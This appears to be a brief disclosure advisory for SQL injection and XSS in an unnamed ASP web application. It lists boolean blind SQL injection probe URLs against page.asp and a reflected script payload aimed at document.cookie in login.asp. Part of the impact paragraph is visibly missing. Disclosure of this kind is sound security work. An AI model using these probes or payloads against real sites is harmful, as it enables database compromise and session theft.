Vulnerability discovered:

 SQL Injection & XSS

Vulnerability impact:

 High - SQL Injection in backend database. Impact depends on the
 	   security and configuration of the database. It may be possible
	   to execute code using functons such as xp_cmdshell in poorly

	   subsequently uploading code or modifying the page content.

Vulnerability information:

 vulnerable to numeric based blind SQL injection.

 Example:

  http://[victim]/page.asp?id=1 	<-- main page
  http://[victim]/page.asp?id=1 AND 1=2 <-- returns blank (false)
  http://[victim]/page.asp?id=1 AND 1=1 <-- main page (true)

  XSS in the 'url' parameter of 'login.asp':

  Example:

  http://[victim]/webadmin/login.asp?url="><script>alert(document.cookie)</script>
